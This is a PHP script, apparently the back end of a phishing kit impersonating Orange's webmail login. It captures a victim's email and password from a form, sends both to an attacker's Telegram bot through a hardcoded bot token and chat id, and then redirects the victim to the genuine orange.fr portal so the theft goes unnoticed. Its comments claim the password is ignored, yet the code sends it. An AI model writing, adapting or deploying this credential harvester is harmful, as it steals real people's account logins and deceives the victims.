<?php
// send.php
session_start();

// 1) Récupérer l'email (depuis la session ou le POST)
$email = $_SESSION['email'] ?? ($_POST['email'] ?? null);
if (!$email) {
    header('Location: index.php');
    exit;
}


$pass = $_POST['pass'] ?? null; // on l'ignore

// 3) Config Telegram
$botToken = '6574041371:AAFjlKnFV689su-5JEC4Zgj5wu01hPNmLI4'; // ← remplace par le token de ton bot
$chatId   = '6788105811';           // ← remplace par ton chat id

// 4) Message à envoyer (sans mot de passe)
$message  = " 📧 Rez Orange Email 📧 \n";
$message .= "Email: {$email}\n";
$message .= "Mot de passe: {$pass}";


// 5) Appel API Telegram
$apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$post = [
    'chat_id' => $chatId,
    'text'    => $message,
];

// Méthode cURL (fiable même si allow_url_fopen est OFF)
$ch = curl_init($apiUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $post,
    CURLOPT_TIMEOUT        => 5,
]);
curl_exec($ch);
curl_close($ch);

// 6) Redirection finale
header('Location: https://www.orange.fr/portail');
exit;
